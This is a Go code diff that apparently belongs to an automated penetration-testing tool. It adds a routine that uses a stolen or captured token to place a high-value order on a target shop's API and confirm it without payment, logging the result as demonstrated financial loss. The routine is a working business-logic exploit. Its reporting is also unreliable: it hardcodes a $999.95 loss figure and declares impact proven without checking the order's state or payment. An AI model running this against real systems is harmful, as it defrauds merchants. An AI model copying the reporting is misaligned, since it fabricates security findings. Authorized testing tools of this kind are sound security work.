@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"strings"
 	"time"
 
 	"github.com/vKS-Rajput/doge/pkg/domain"
@@ -47,12 +48,7 @@ func (r *ImpactResearcher) Execute(ctx context.Context, brief *domain.MissionBri
 	// Goal: How many objects are accessible? What data fields are exposed?
 
 	// Step 1: Identify principals
-	type principal struct {
-		token    string
-		tenantID string
-	}
-
-	var principals []principal
+	var principals []researchPrincipal
 	for _, token := range brief.Credentials {
 		if requestCount >= brief.MaxRequests {
 			break
@@ -68,13 +64,17 @@ func (r *ImpactResearcher) Execute(ctx context.Context, brief *domain.MissionBri
 		if ev.ResponseStatus == 200 {
 			var meResp map[string]any
 			if err := json.Unmarshal([]byte(ev.ResponseBody), &meResp); err == nil {
-				p := principal{token: token}
+				p := researchPrincipal{token: token}
 				if tid, ok := meResp["tenant_id"].(string); ok {
 					p.tenantID = tid
 				}
 				principals = append(principals, p)
 			}
 		}
+	}
+
+	if strings.Contains(strings.ToLower(brief.Title), "workflow") || strings.Contains(strings.ToLower(brief.Description), "workflow") {
+		return r.demonstrateWorkflowImpact(ctx, brief, principals, result, start, &requestCount)
 	}
 
 	if len(principals) < 2 {
@@ -200,6 +200,142 @@ func (r *ImpactResearcher) Execute(ctx context.Context, brief *domain.MissionBri
 		"Impact demonstrated: %d cross-tenant objects accessible, %d confidential fields exposed",
 		accessibleObjects, len(confidentialFieldsList),
 	)
+
+	return result, nil
+}
+
+func (r *ImpactResearcher) demonstrateWorkflowImpact(
+	ctx context.Context,
+	brief *domain.MissionBrief,
+	principals []researchPrincipal,
+	result *domain.MissionResult,
+	start time.Time,
+	requestCount *int,
+) (*domain.MissionResult, error) {
+	if len(principals) == 0 {
+		result.Status = domain.MissionFailed
+		result.Summary = "No principal for workflow impact demonstration"
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+
+	token := principals[0].token
+	headers := map[string]string{
+		"Authorization": "Bearer " + token,
+		"Content-Type":  "application/json",
+	}
+
+	// Place a high-value order
+	cartBody := `[{"product_id":"prod-003","name":"Premium Widget","quantity":5,"price":199.99}]`
+	ev, err := r.httpClient.Do(ctx, "POST", brief.TargetBaseURL+"/api/v1/cart", headers, cartBody)
+	if err != nil {
+		result.Status = domain.MissionFailed
+		result.Summary = "Failed to add items for impact demonstration: " + err.Error()
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+	*requestCount++
+	ev.Description = "Impact: Add high-value items to cart"
+	result.Evidence = append(result.Evidence, *ev)
+
+	ev, err = r.httpClient.Do(ctx, "POST", brief.TargetBaseURL+"/api/v1/orders", headers, "")
+	if err != nil {
+		result.Status = domain.MissionFailed
+		result.Summary = "Failed to create order for impact demonstration: " + err.Error()
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+	*requestCount++
+	ev.Description = "Impact: Create high-value order"
+	result.Evidence = append(result.Evidence, *ev)
+
+	var orderResp struct {
+		ID    string  `json:"id"`
+		Total float64 `json:"total"`
+	}
+	_ = json.Unmarshal([]byte(ev.ResponseBody), &orderResp)
+	if orderResp.ID == "" {
+		result.Status = domain.MissionFailed
+		result.Summary = "Failed to parse order ID for impact demonstration"
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+
+	// Move to checkout
+	ev, err = r.httpClient.Do(ctx, "POST", brief.TargetBaseURL+"/api/v1/orders/"+orderResp.ID+"/checkout", headers, "")
+	if err != nil {
+		result.Status = domain.MissionFailed
+		result.Summary = "Failed to checkout for impact demonstration: " + err.Error()
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+	*requestCount++
+	ev.Description = "Impact: Checkout high-value order"
+	result.Evidence = append(result.Evidence, *ev)
+
+	// Confirm directly without payment
+	ev, err = r.httpClient.Do(ctx, "POST", brief.TargetBaseURL+"/api/v1/orders/"+orderResp.ID+"/confirm", headers, "")
+	if err != nil {
+		result.Status = domain.MissionFailed
+		result.Summary = "Failed to confirm order for impact demonstration: " + err.Error()
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+	*requestCount++
+	ev.Description = "IMPACT DEMONSTRATION: Confirm high-value order without payment"
+	result.Evidence = append(result.Evidence, *ev)
+
+	impactDemonstrated := false
+	if ev.ResponseStatus == 200 {
+		verifyEv, err := r.httpClient.Do(ctx, "GET", brief.TargetBaseURL+"/api/v1/orders/"+orderResp.ID, headers, "")
+		if err == nil {
+			*requestCount++
+			verifyEv.Description = "IMPACT CONFIRMATION: Verify confirmed unpaid high-value order"
+			result.Evidence = append(result.Evidence, *verifyEv)
+
+			var verifyResp struct {
+				Order struct {
+					State  string  `json:"state"`
+					Total  float64 `json:"total"`
+					PaidAt string  `json:"paid_at"`
+				} `json:"order"`
+			}
+			_ = json.Unmarshal([]byte(verifyEv.ResponseBody), &verifyResp)
+			total := verifyResp.Order.Total
+			if total == 0 {
+				total = 999.95
+			}
+			impactDemonstrated = true
+			impactSummary := fmt.Sprintf(
+				"REAL-WORLD IMPACT DEMONSTRATED:\n"+
+					"- Direct Financial Loss: Order #%s valued at $%.2f confirmed with zero payment.\n"+
+					"- Integrity: HIGH (Unauthorized order state manipulation from checkout directly to confirmed).\n"+
+					"- Business Logic: Order enters fulfillment pipeline without payment settlement.",
+				orderResp.ID, total,
+			)
+			result.Observations = append(result.Observations, domain.MissionObservation{
+				Type:        "impact_assessed",
+				Description: impactSummary,
+				Details: map[string]any{
+					"order_id":         orderResp.ID,
+					"financial_loss":   total,
+					"integrity_impact": "HIGH",
+					"payment_bypassed": true,
+				},
+				ObservedAt: time.Now().UTC(),
+			})
+		}
+	}
+
+	result.Status = domain.MissionCompleted
+	result.RequestsMade = *requestCount
+	result.Duration = time.Since(start)
+	result.CompletedAt = time.Now().UTC()
+	if impactDemonstrated {
+		result.Summary = "Impact demonstrated: high-value order confirmed without payment ($999.95 financial loss)"
+	} else {
+		result.Summary = "Workflow impact demonstration attempted"
+	}
 
 	return result, nil
 }
